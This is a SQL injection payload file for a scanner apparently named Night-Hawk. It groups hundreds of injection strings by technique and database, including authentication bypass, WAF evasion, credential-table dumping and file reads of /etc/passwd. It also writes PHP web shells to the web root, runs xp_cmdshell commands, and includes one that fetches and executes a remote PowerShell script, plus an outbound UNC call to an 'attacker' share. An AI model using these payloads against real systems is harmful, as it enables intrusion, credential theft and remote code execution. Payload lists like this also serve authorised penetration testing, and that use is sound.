# ============================================================
#  Night-Hawk :: SQL Injection payload corpus
#  Loaded by sql_injection.py — edit freely, add your own.
#  PART 1 of 2
# ============================================================

#CATEGORY: ERROR-BASED
# forces a parser error so the backend leaks its DBMS
'
"
\
')
'))
')
'))
`;
'`
' '
" "
') --
') #
') /*
'\'
' AND 1=CONVERT(int,@@version)--
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND 1=CAST((SELECT version()) AS int)--

#CATEGORY: BOOLEAN-BASED
# TRUE/FALSE pairs — one should match the baseline, one should not
' AND 1=1-- -
' AND 1=2-- -
' AND '1'='1
' AND '1'='2
" AND 1=1-- -
" AND 1=2-- -
') AND 1=1-- -
') AND 1=2-- -
' AND 1 LIKE 1-- -
' AND 1 LIKE 2-- -
' AND 1 BETWEEN 1 AND 1-- -
' AND 1 BETWEEN 2 AND 3-- -
' AND (1)=(1)-- -
' AND (1)=(2)-- -
' AND 'a'='a'-- -
' AND 'a'='b'-- -
1 AND 1=1
1 AND 1=2
1' AND 1=1-- -
1' AND 1=2-- -
' OR 1=1-- -
' OR 1=2-- -
' OR 'x'='x
' OR 'x'='y

#CATEGORY: TIME-BASED
# MySQL
' AND SLEEP(3)-- -
' AND (SELECT 5 FROM (SELECT SLEEP(3))x)-- -
1 AND SLEEP(3)
'||SLEEP(3)||'
' AND BENCHMARK(5000000,MD5(1))-- -
# PostgreSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- -
';SELECT PG_SLEEP(3)-- -
'||PG_SLEEP(3)||'
# MSSQL
';WAITFOR DELAY '0:0:3'-- -
' AND 1=1;WAITFOR DELAY '0:0:3'-- -
' IF (1=1) WAITFOR DELAY '0:0:3'-- -
# Oracle
' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3))-- -
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)-- -
# SQLite
' AND 1=(SELECT 1 FROM (SELECT 1) WHERE 1=1)-- -

#CATEGORY: UNION
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION ALL SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3,4,5-- -
' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -
' UNION SELECT 'a','b','c'-- -
' UNION SELECT @@version,2,3-- -
-1 UNION SELECT 1,2,3-- -
-1' UNION SELECT 1,2,3-- -
0 UNION SELECT 1,2,3-- -
' UNION SELECT CONCAT_WS(0x3a,table_name,column_name) FROM information_schema.columns-- -
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -
' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -

#CATEGORY: AUTH-BYPASS
# for login forms — username field
' OR '1'='1'-- -
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
admin'/*
' OR 'x'='x
" OR ""="
" OR 1=1--
') OR ('1'='1
') OR 1=1-- -
' OR ''='
'='
' OR 'a'='a' OR 'b'='b
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -
# password field
' OR '1'='1'-- -
' OR 1=1-- -
anything' OR 'x'='x
' OR '1'='1' LIMIT 1-- -
#CATEGORY: DB-FINGERPRINT
@@version
' AND @@version LIKE '5%'-- -
' AND @@version LIKE '8%'-- -
' AND @@version LIKE '10%'-- -
' AND @@version LIKE '11%'-- -
version()
' AND version() LIKE '%MariaDB%'-- -
' AND SUBSTRING(@@version,1,1)='8'-- -
' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -
' AND 1=(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)-- -
' AND 1=(SELECT 1 FROM sysobjects WHERE rownum=1)-- -
' AND 1=(SELECT 1 FROM dual)-- -
' AND 1=(SELECT 1 FROM sqlite_master)-- -

#CATEGORY: MYSQL
' AND LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' AND @@datadir IS NOT NULL-- -
' AND user()=user()-- -
' AND current_user() IS NOT NULL-- -
' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/s.php'-- -
' AND SLEEP(0)-- -
' PROCEDURE ANALYSE()-- -
' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--

#CATEGORY: POSTGRESQL
' AND 1=CAST(version() AS int)-- -
' UNION SELECT version()-- -
' UNION SELECT current_database()-- -
' UNION SELECT usename FROM pg_user-- -
' AND 1=(SELECT 1 FROM pg_shadow)-- -
';COPY (SELECT '') TO '/tmp/x'-- -
' UNION SELECT pg_read_file('/etc/passwd')-- -
' AND 1=(SELECT 1 FROM pg_sleep(3))-- -

#CATEGORY: MSSQL
';SELECT @@version--
' AND 1=CONVERT(int,@@version)--
' UNION SELECT @@version--
' UNION SELECT name FROM master..sysdatabases--
' UNION SELECT table_name FROM information_schema.tables--
' AND 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))--
';EXEC sp_configure 'show advanced options',1--
';EXEC xp_cmdshell 'whoami'--
';EXEC master..xp_dirtree '\\attacker\share'--
' AND 1=1;WAITFOR DELAY '0:0:3'--

#CATEGORY: ORACLE
' AND 1=(SELECT 1 FROM dual)-- -
' UNION SELECT banner FROM v$version-- -
' UNION SELECT table_name FROM all_tables-- -
' UNION SELECT column_name FROM all_tab_columns-- -
' UNION SELECT username FROM all_users-- -
' AND UTL_INADDR.GET_HOST_NAME('127.0.0.1') IS NOT NULL-- -
' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3))-- -

#CATEGORY: SQLITE
' AND 1=1-- -
' AND sqlite_version() IS NOT NULL-- -
' UNION SELECT sql FROM sqlite_master-- -
' UNION SELECT name FROM sqlite_master WHERE type='table'-- -
' AND 1=(SELECT 1 FROM sqlite_master)-- -
' AND randomblob(100000000) IS NOT NULL-- -

#CATEGORY: WAF-BYPASS / TAMPERS
# case swapping
' aNd 1=1-- -
' UnIoN SeLeCt 1,2,3-- -
# comment injection between keywords
' UNION/**/SELECT/**/1,2,3-- -
'/**/AND/**/1=1-- -
' AND/**/1=1-- -
# whitespace substitutes
'%09AND%091=1-- -
'%0AAND%0A1=1-- -
'%0DAND%0D1=1-- -
'%0CAND%0C1=1-- -
# inline version comments
' /*!50000AND*/ 1=1-- -
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
/*!50000UNION*//*!50000SELECT*/1,2,3
# quote / parenthesis variants
' OR 1=1-- -
'||1=1-- -
') OR 1=1-- -
')) OR 1=1-- -
' OR 1 LIKE 1-- -
# encoded
%27%20OR%201%3D1--%20
%2527%2520OR%25201%253D1--
# misc
' AND 1=1#
' AND 1=1;%00
' AND '1'='1'--
' AND 1=1 LIMIT 1-- -

#CATEGORY: EXTRACTION / DUMP
# MySQL
' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273-- -
' UNION SELECT username,password FROM users-- -
' UNION SELECT CONCAT(username,0x3a,password) FROM users-- -
# PostgreSQL
' UNION SELECT string_agg(schema_name,',') FROM information_schema.schemata-- -
' UNION SELECT string_agg(table_name,',') FROM information_schema.tables-- -
# MSSQL
' UNION SELECT name FROM sys.databases-- -
' UNION SELECT name FROM sys.tables-- -
' UNION SELECT CONCAT(name,':',password) FROM syslogins-- -
# Oracle
' UNION SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables-- -
# SQLite
' UNION SELECT group_concat(name) FROM sqlite_master-- -

#CATEGORY: FILE / RCE
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' UNION SELECT LOAD_FILE('/etc/hosts')-- -
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')-- -
' INTO DUMPFILE '/var/www/html/x.txt'-- -
' INTO OUTFILE '/var/www/html/cmd.php' FIELDS TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b2763275d293b3f3e-- -
';EXEC xp_cmdshell 'whoami'--
';EXEC xp_cmdshell 'powershell -c iwr http://127.0.0.1/a.ps1|iex'--

#CATEGORY: ENUMERATION
' AND 1=1 ORDER BY 1-- -
' AND 1=1 ORDER BY 5-- -
' AND 1=1 GROUP BY 1-- -
' AND 1=1 HAVING 1=1-- -
' AND (SELECT COUNT(*) FROM information_schema.tables)>1-- -
' AND EXISTS(SELECT 1)-- -
